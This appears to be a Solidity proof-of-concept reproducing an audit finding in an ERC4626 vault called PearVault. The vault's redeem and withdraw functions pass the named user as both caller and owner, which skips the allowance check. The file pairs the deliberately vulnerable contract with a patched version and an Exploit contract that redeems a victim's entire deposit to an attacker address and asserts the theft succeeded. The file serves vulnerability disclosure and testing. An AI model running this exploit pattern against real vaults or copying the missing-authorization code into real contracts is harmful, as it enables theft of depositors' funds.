// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Pear Vault finding 65286-C-01:
// "Missing Authorization in withdraw() and redeem() Allows Theft of Any User's
//  Funds".
//
// PearVault (an ERC4626 vault) exposes redeem(shares, receiver, user) and
// withdraw(assets, receiver, owner) that let ANY caller name an arbitrary
// `user`/`owner` whose shares are burned and an arbitrary `receiver` who gets
// the underlying assets. The internal _withdrawWithFee(shares, user, receiver)
// forwards `user` as BOTH the `caller` and `owner` arguments of the base
// ERC4626 _withdraw(). OpenZeppelin's _withdraw only runs the allowance check
// when `caller != owner`, so passing them equal removes the authorization
// mechanism entirely. An attacker calls redeem(victimShares, attacker, victim)
// to burn the victim's shares and receive the assets themselves — a total loss
// of all depositors' funds.
//
// The verbatim vulnerable bodies (redeem / withdraw / _withdrawWithFee) are
// inlined below over a minimal-but-faithful ERC4626 base that reproduces the
// exact OZ semantic the bug abuses (allowance checked ONLY when caller != owner).
// The only double is a minimal ERC20 for the underlying asset. Fee is 0 for a
// clean assertion; _canDirectWithdraw returns true by holding enough liquid
// asset. Nothing on the vulnerable path is mocked.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math (floor + ceil mulDiv).
library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a * b / c;
    }

    function mulDivUp(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        uint256 p = a * b;
        return p == 0 ? 0 : (p - 1) / c + 1;
    }
}

/// @dev Minimal ERC20 double for the vault's underlying asset (the STOLEN asset).
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful ERC4626 base (models OpenZeppelin's ERC4626Upgradeable +
// ERC20Upgradeable). The load-bearing invariant preserved verbatim: _withdraw
// runs _spendAllowance ONLY when caller != owner — the exact semantic the bug
// abuses. Conversions use OZ virtual-shares math (decimalsOffset = 0).
// ─────────────────────────────────────────────────────────────────────────────
abstract contract ERC4626Base {
    // ERC20 (shares) state
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;

    MiniToken internal _asset;

    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);
    event Withdraw(
        address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares
    );

    constructor(MiniToken asset_) {
        _asset = asset_;
    }

    // ---- ERC20 share token ----
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _allowances[msg.sender][spender] = value;
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        _totalSupply += amount;
        _balances[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        _balances[from] -= amount;
        _totalSupply -= amount;
    }

    /// @dev OZ ERC20._spendAllowance: reverts when the spender lacks allowance
    ///      (infinite allowance is not decremented).
    function _spendAllowance(address owner, address spender, uint256 value) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= value, "ERC20: insufficient allowance");
            _allowances[owner][spender] = currentAllowance - value;
        }
    }

    // ---- ERC4626 accounting ----
    function totalAssets() public view returns (uint256) {
        return _asset.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        return Math.mulDiv(assets, _totalSupply + 1, totalAssets() + 1);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        return Math.mulDiv(shares, totalAssets() + 1, _totalSupply + 1);
    }

    function previewRedeem(uint256 shares) public view virtual returns (uint256) {
        return convertToAssets(shares);
    }

    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {
        return Math.mulDivUp(assets, _totalSupply + 1, totalAssets() + 1);
    }

    function deposit(uint256 assets, address receiver) public virtual returns (uint256) {
        uint256 shares = convertToShares(assets);
        _asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
        emit Deposit(msg.sender, receiver, assets, shares);
        return shares;
    }

    /// @dev OZ ERC4626._withdraw — allowance is enforced ONLY when caller != owner.
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
        virtual
    {
        if (caller != owner) {
            _spendAllowance(owner, caller, shares);
        }
        _burn(owner, shares);
        _asset.transfer(receiver, assets);
        emit Withdraw(caller, receiver, owner, assets, shares);
    }

    function redeem(uint256 shares, address receiver, address user) public virtual returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) public virtual returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the verbatim redeem / withdraw / _withdrawWithFee bodies
// from the finding, inlined over the faithful ERC4626 base above.
// ─────────────────────────────────────────────────────────────────────────────
contract PearVault is ERC4626Base {
    error InsufficientBalance();

    bool internal vaultActive;
    uint256 private _reentrancyStatus;

    modifier nonReentrant() {
        require(_reentrancyStatus != 2, "ReentrancyGuard: reentrant call");
        _reentrancyStatus = 2;
        _;
        _reentrancyStatus = 1;
    }

    modifier onlyActiveVault() {
        require(vaultActive, "Vault not active");
        _;
    }

    constructor(MiniToken asset_) ERC4626Base(asset_) {
        vaultActive = true;
        _reentrancyStatus = 1;
    }

    /// @dev Direct withdrawals are permitted while the vault holds enough liquid
    ///      underlying to satisfy the request (fee = 0 in this reproduction).
    function _canDirectWithdraw(uint256 assets) internal view returns (bool) {
        return _asset.balanceOf(address(this)) >= assets;
    }

    // ===== VERBATIM VULNERABLE CODE — PearVault.sol L496-L509 =====
    function redeem(uint256 shares, address receiver, address user)
        public
        override
        nonReentrant
        onlyActiveVault
        returns (uint256)
    {
        if (balanceOf(user) < shares) revert InsufficientBalance();

        uint256 assets = super.previewRedeem(shares);
        if (!_canDirectWithdraw(assets)) {
            revert("Direct redeem not allowed. Use requestWithdrawal() for queued redeem");
        }

        return _withdrawWithFee(shares, user, receiver);
    }

    // ===== VERBATIM VULNERABLE CODE — PearVault.sol L512-L524 =====
    function withdraw(uint256 assets, address receiver, address owner)
        public
        override
        nonReentrant
        onlyActiveVault
        returns (uint256)
    {
        if (!_canDirectWithdraw(assets)) {
            revert("Direct withdraw not allowed. Use requestWithdrawal() for queued withdrawal");
        }
        uint256 shares = super.previewWithdraw(assets);
        if (balanceOf(owner) < shares) revert InsufficientBalance();
        _withdrawWithFee(shares, owner, receiver);
        return shares;
    }

    // ===== VERBATIM VULNERABLE CODE — PearVault.sol L703-L709 =====
    function _withdrawWithFee(uint256 shares, address user, address receiver) internal returns (uint256) {
        // code
        uint256 assetsToTransfer = super.previewRedeem(shares); // fee == 0 -> full asset value
        super._withdraw(
            user, // @> caller (same as owner to avoid allowance check) -> super._withdraw skips _spendAllowance, so ANY attacker may pass a victim as `user`
            receiver, // receiver
            user, // owner of shares
            assetsToTransfer, // assets to transfer (after fee)
            shares // shares to burn
        );
        // code
        return assetsToTransfer;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract — the finding's recommended patch: enforce authorization at the
// start of redeem/withdraw (msg.sender must be the owner or hold allowance).
// The same attacker call now reverts for lack of allowance.
// ─────────────────────────────────────────────────────────────────────────────
contract PearVaultFixed is ERC4626Base {
    error InsufficientBalance();

    bool internal vaultActive;
    uint256 private _reentrancyStatus;

    modifier nonReentrant() {
        require(_reentrancyStatus != 2, "ReentrancyGuard: reentrant call");
        _reentrancyStatus = 2;
        _;
        _reentrancyStatus = 1;
    }

    modifier onlyActiveVault() {
        require(vaultActive, "Vault not active");
        _;
    }

    constructor(MiniToken asset_) ERC4626Base(asset_) {
        vaultActive = true;
        _reentrancyStatus = 1;
    }

    function _canDirectWithdraw(uint256 assets) internal view returns (bool) {
        return _asset.balanceOf(address(this)) >= assets;
    }

    function redeem(uint256 shares, address receiver, address user)
        public
        override
        nonReentrant
        onlyActiveVault
        returns (uint256)
    {
        if (balanceOf(user) < shares) revert InsufficientBalance();
        if (msg.sender != user) {
            _spendAllowance(user, msg.sender, shares); // FIX: authorize caller
        }

        uint256 assets = super.previewRedeem(shares);
        if (!_canDirectWithdraw(assets)) {
            revert("Direct redeem not allowed. Use requestWithdrawal() for queued redeem");
        }

        return _withdrawWithFee(shares, user, receiver);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        public
        override
        nonReentrant
        onlyActiveVault
        returns (uint256)
    {
        if (!_canDirectWithdraw(assets)) {
            revert("Direct withdraw not allowed. Use requestWithdrawal() for queued withdrawal");
        }
        uint256 shares = super.previewWithdraw(assets);
        if (balanceOf(owner) < shares) revert InsufficientBalance();
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares); // FIX: authorize caller
        }
        _withdrawWithFee(shares, owner, receiver);
        return shares;
    }

    function _withdrawWithFee(uint256 shares, address user, address receiver) internal returns (uint256) {
        uint256 assetsToTransfer = super.previewRedeem(shares);
        super._withdraw(user, receiver, user, assetsToTransfer, shares);
        return assetsToTransfer;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the attacker (this contract, an arbitrary caller that never
// held the victim's shares) burns the victim's shares and pockets the underlying
// by calling redeem(victimShares, ATTACKER, VICTIM). The stolen asset lands at
// the attacker EOA — a real theft.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant DEPOSIT = 1000 ether; // victim's stake

    // deployed pieces (fixed constructor order: index 0 = asset, index 1 = vault)
    MiniToken public asset;
    PearVault public vault;

    // exposed results
    uint256 public attackerAssetAfter;
    uint256 public victimSharesAfter;
    uint256 public victimSharesBefore;
    address public assetAddr;
    address public vaultAddr;
    address public attackerAddr;
    address public victimAddr;

    constructor() {
        asset = new MiniToken("Stolen Asset", "STOLEN-ASSET"); // deploy_order[0]
        vault = new PearVault(asset); // deploy_order[1]
        assetAddr = address(asset);
        vaultAddr = address(vault);
        attackerAddr = ATTACKER;
        victimAddr = VICTIM;
    }

    function run() external payable {
        // --- victim deposits: this contract funds the deposit but credits the
        //     shares to the victim (mints VICTIM's ERC4626 shares) ---
        asset.mint(address(this), DEPOSIT);
        asset.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT, VICTIM);

        victimSharesBefore = vault.balanceOf(VICTIM); // == DEPOSIT (1:1 first deposit)

        // --- attack: an arbitrary caller (this contract) redeems the VICTIM's
        //     shares to the ATTACKER. No allowance is held; the bug passes `user`
        //     as both caller and owner so super._withdraw skips _spendAllowance. ---
        uint256 shares = victimSharesBefore;
        vault.redeem(shares, ATTACKER, VICTIM);

        attackerAssetAfter = asset.balanceOf(ATTACKER);
        victimSharesAfter = vault.balanceOf(VICTIM);

        // --- harm: attacker stole the full deposit; victim's shares are gone ---
        require(attackerAssetAfter == DEPOSIT, "attacker did not receive stolen assets");
        require(victimSharesAfter == 0, "victim shares not burned");
    }
}
